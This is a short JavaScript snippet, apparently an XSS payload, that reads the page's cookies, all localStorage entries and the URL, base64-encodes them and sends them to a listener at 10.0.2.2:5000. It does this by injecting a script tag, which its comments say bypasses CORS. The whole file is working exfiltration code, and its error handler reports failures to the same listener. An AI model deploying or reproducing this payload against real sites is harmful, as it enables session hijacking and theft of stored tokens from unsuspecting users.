(function(){
    function safeBtoa(str) {
        return btoa(unescape(encodeURIComponent(str)));
    }

    try {
        var cookie = document.cookie || "None";
        
        var localData = "LS: ";
        for (var i = 0; i < localStorage.length; i++) {
            var key = localStorage.key(i);
            var value = localStorage.getItem(key);
            localData += key + "=" + value + "; ";
        }

        var location = window.location.href;
        var rawData = "Cookies: " + cookie + " | Local: " + localData + " | URL: " + location;
        var data = safeBtoa(rawData);
        
        // Change 1: Drop XHR entirely. Create a script element instead.
        var scriptTag = document.createElement('script');
        
        // Change 2: Set the source to your Python listener
        scriptTag.src = "http://10.0.2.2:5000/log?data=" + data;
        
        // Change 3: Injecting it into the document forces the GET request instantly, bypassing CORS
        document.head.appendChild(scriptTag);

    } catch (err) {
        // Apply the same fix to the error reporter
        var errorData = safeBtoa("CRASH: " + err.message);
        var errScript = document.createElement('script');
        errScript.src = "http://10.0.2.2:5000/log?data=" + errorData;
        document.head.appendChild(errScript);
    }
})();